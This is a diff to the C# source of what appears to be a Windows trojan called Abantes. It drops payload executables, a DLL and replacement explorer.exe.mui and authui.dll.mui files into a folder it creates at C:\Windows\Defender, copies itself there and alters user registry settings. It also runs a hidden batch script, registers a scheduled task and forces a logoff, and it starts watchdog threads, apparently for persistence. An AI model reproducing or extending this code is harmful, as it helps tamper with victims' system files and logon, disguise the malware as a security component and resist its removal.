@@ -28,7 +28,6 @@ namespace Abantes
                 Directory.CreateDirectory(@"C:\Windows\Defender");
                 File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
                 File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
-                File.WriteAllText(extractPath + "\\ExplorerOverwrite.bat", Resources.ExplorerOverWrite);
                 File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
                 File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
                 File.WriteAllBytes(extractPath + "\\LogonUIStart.exe", Resources.LogonUI_Start);
@@ -36,6 +35,10 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
                 File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
                 File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
+                File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
+                File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
+                File.WriteAllBytes(extractPath + "\\Audio.mp3", Resources.Audio);
+                File.WriteAllBytes(extractPath + "\\CursorFollow.exe", Resources.Cursor_Follow);
                 Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
@@ -176,11 +179,14 @@ namespace Abantes
                 editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                 editKey.SetValue("NWPen", extractPath + "\\cursor.cur");
                 editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse");
+                editKey.SetValue("MouseTrails", "7");
+                editKey.Close();
 
                 Process ScriptProcess = new Process();
-                ScriptProcess.StartInfo.UseShellExecute = false;
                 ScriptProcess.StartInfo.CreateNoWindow = true;
-                ScriptProcess.StartInfo.FileName = extractPath + @"\Action.bat";
+                ScriptProcess.StartInfo.UseShellExecute = false;
+                ScriptProcess.StartInfo.FileName = extractPath + "\\Action.bat";
                 ScriptProcess.Start();
 
                 TaskService ts = new TaskService();
@@ -196,9 +202,9 @@ namespace Abantes
                 editKey.SetValue("AbantesWasHere", "1");
                 editKey.Close();
 
-                MessageBox.Show("Abantes Wants To Meet You","I Want Too Meet You");
+                Thread.Sleep(8000);
 
-                Thread.Sleep(1000);
+                MessageBox.Show("Abantes Wants To Meet You","I Want Too Meet You");
 
                 Others.StartProcess("shutdown.exe", "/l /f");
             }
@@ -210,6 +216,7 @@ namespace Abantes
                 Thread watchdogThread = new Thread(new ThreadStart(Threads.WathcDogThread));
                 normalThread.Start();
                 watchdogThread.Start();
+                
             }
         }
     }
